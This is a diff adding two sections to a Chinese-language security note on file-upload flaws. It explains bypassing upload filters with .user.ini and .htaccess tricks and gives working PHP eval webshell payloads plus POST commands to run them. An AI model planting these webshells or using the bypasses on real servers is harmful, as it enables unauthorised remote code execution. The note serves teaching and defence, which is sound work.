@@ -227,6 +227,40 @@ Java Native
 
 在java中JKD1.7.0_40前的版本中若使用FileOutputStream实现文件上传功能的内容保存，可能导致00截断，绕过黑名单、文件上传白名单检测。之后的版本会对文件路径检查，若文件路径有非法字符，则抛出异常Invalid file path
 
+### .user.ini绕过
+
+自 PHP 5.3.0 起，PHP 支持基于每个目录的 INI 文件配置。此类文件   *仅*被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner   扩展作废。如果你的 PHP 以模块化运行在 Apache 里，则用 .htaccess 文件有同样效果。
+
+除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web   根目录（[$_SERVER['DOCUMENT_ROOT'\]](https://www.php.net/manual/zh/reserved.variables.server.php)   所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。
+
+漏洞形成条件
+
+- nginx服务器
+- 服务器脚本语言为php>5.3.0
+- 能够上传.use.ini文件
+- 服务器使用CGI/FastCGI模式
+- 上传目录下有可执行的php文件
+
+漏洞利用
+
+1. 上传.user.ini，内容为`GIF89a auto_append_file=a.k1`，利用GIF89a绕过文件内容检测
+2. 上传a.k1文件，内容为`GIF89a <script language="php">eval($_POST[a]);</script>`，利用<script>标签来绕过<?内容过滤
+3. 上传index.php文件，内容为`<?php 
+   include_once 'a.k1';
+   ?>`，包含文件a.k1，然后访问index.php并post数据`a=system("notepad");`执行命令
+
+### .htaccess绕过
+
+漏洞形成条件
+
+- apache服务器
+- 能够上传.htaccess文件，一般为黑名单限制。
+- AllowOverride All，默认配置为关闭None。
+- LoadModule rewrite_module modules/mod_rewrite.so #模块为开启状态
+- 上传目录具有可执行权限。
+
+上传.htaccess文件内容为`AddType application/x-httpd-php .png`，将png后缀文件解析为php，在1.png末尾写入`<?php @eval($_POST[123]); ?>`，上传并访问1.png，post数据`123=system("notepad");`执行命令
+
 ## 文件上传防御
 
 - 使用白名单策略检查文件扩展名
